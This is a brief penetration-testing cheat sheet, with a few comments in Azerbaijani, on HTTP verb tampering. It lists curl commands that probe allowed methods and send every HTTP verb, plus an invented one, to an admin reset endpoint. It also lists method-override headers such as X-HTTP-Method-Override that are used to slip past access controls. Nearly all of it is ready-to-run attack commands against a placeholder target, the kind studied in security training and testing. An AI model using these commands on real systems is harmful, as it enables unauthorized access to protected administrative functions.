# HTTP Verb Tampering
```powershell
curl -i -X OPTIONS http://TARGET_IP/

# Cavab:
Allow: POST, OPTIONS, HEAD, GET
```

# Blocked OPTIONS
```powershell
# GET
curl -i -X GET http://TARGET/admin/reset.php

# POST
curl -i -X POST http://TARGET/admin/reset.php

# HEAD
curl -i -X HEAD http://TARGET/admin/reset.php

# PUT
curl -i -X PUT http://TARGET/admin/reset.php

# DELETE
curl -i -X DELETE http://TARGET/admin/reset.php

# PATCH
curl -i -X PATCH http://TARGET/admin/reset.php

# TRACE
curl -i -X TRACE http://TARGET/admin/reset.php

# CONNECT
curl -i -X CONNECT http://TARGET/admin/reset.php

# Tamamilə saxta/uydurma metod
curl -i -X FAKE http://TARGET/admin/reset.php
```

# Header Manipulating
```powershell
# X-HTTP-Method-Override
curl -i -X POST http://TARGET/admin/reset.php \
  -H "X-HTTP-Method-Override: PUT"

# X-Method-Override
curl -i -X POST http://TARGET/admin/reset.php \
  -H "X-Method-Override: DELETE"

# X-HTTP-Method
curl -i -X POST http://TARGET/admin/reset.php \
  -H "X-HTTP-Method: HEAD"
```

